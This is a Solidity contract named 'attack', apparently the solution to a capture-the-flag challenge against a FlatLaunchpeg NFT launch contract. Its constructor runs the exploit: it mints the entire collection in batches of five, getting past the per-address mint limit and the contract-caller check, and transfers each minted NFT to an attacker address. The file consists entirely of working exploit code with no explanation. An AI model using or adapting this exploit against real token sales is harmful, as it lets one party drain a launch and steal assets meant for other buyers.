// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;
import "./FlatLaunchpeg.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
contract attack {
    constructor(address _flatLaunchJpegContract, address attacker) public{
        
        FlatLaunchpeg flatLaunchCotract = FlatLaunchpeg(_flatLaunchJpegContract);
        uint256 maxMintsize = 5;
        // get the collection size in our case 69
        uint256 totalSize = flatLaunchCotract.collectionSize();

        //a counter for the NFT ids to make my life easier because the ids will start at 0
        uint256 counter = 0;

        //while we have not reach 69
        while(totalSize >= maxMintsize ){
            flatLaunchCotract.publicSaleMint(5);

            //approve transfer of all from this contract to attacker
            ERC721(flatLaunchCotract).setApprovalForAll(attacker,true);
            for(uint256 i;i<maxMintsize;i++){
            // transfer the nft to the attacker
            ERC721(flatLaunchCotract).safeTransferFrom(address(this),attacker,counter);
            counter++;}
            totalSize = totalSize - maxMintsize;
        }

        // check if there are any remainder which in our case will be 4
        if(totalSize > 0)
        {
            flatLaunchCotract.publicSaleMint(totalSize);

            //approve transfer of all from this contract to attacker
            ERC721(flatLaunchCotract).setApprovalForAll(attacker,true);
            for(uint256 i;i<totalSize;i++){
                // transfer the nft to the attacker
                ERC721(flatLaunchCotract).safeTransferFrom(address(this),attacker,counter);
                counter++;
            }
        }

    }
}
